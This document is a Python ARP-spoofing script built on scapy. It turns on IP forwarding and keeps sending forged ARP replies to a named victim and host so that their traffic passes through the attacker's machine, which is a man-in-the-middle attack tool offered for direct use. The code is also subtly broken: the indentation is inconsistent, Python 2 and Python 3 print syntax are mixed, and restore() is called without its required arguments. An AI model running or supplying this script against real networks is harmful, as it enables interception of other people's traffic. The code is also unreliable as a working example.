#!/usr/bin/python
import scapy.all as scapy
import sys
import os
import socket as s
import threading
import time

'''ARP Spoofer

Parameters
----------
VictimIP : str
    The target's IP address
HostIP : str
    Host's IP address

Returns: (-)
---------
'''

# Enable IP Forwarding
def _enable_linux_iproute():
	print(" ***  Enabling IP forwarding  *** \n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Reads and returns arguments
def get_args():
    if len(sys.argv) == 3:
        return sys.argv[1], sys.argv[2]
    else:
        print(" ***  Invalid amount of arguments.  *** \n")
        print("Syntax: python ARPspoofing.py <targetIP> <hostIP>")
        sys.exit()

# Returns MAC address of device with the specified IP and connected to the network
def get_mac(ip):
    ans, _ = scapy.srp(scapy.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.ARP(pdst=ip), timeout=3, verbose=0)
    if ans:
        return ans[0][1].src
    return None

# Poison target by saying that the attacker is the desirable host machine
def spoof(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    self_mac = scapy.ARP().hwsrc
    scapy.send(scapy.ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=self_mac))


# Re-assigning the real addresses to restore communication in network
def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    scapy.send(scapy.ARP(op="is-at", pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac))

# Function to perform the poisoning
def execute():
    target, host = get_args()

    try:
        while True:
            spoof(target, host)
            spoof(host, target)
            time.sleep(1)
    except KeyboardInterrupt:
        print " ***  Spoofing Stopped  *** \n"
        restore()
        sys.exit()
        
if __name__ == "__main__":

    _enable_linux_iproute()
    print(" ***  Starting ARP spoofing  *** \n")
    print(" ***  To stop press Ctrl+C  *** \n")
    threading.Thread(target=execute).start()
    print " ***  Spoofing Stopped  *** \n"
    restore()
    sys.exit()
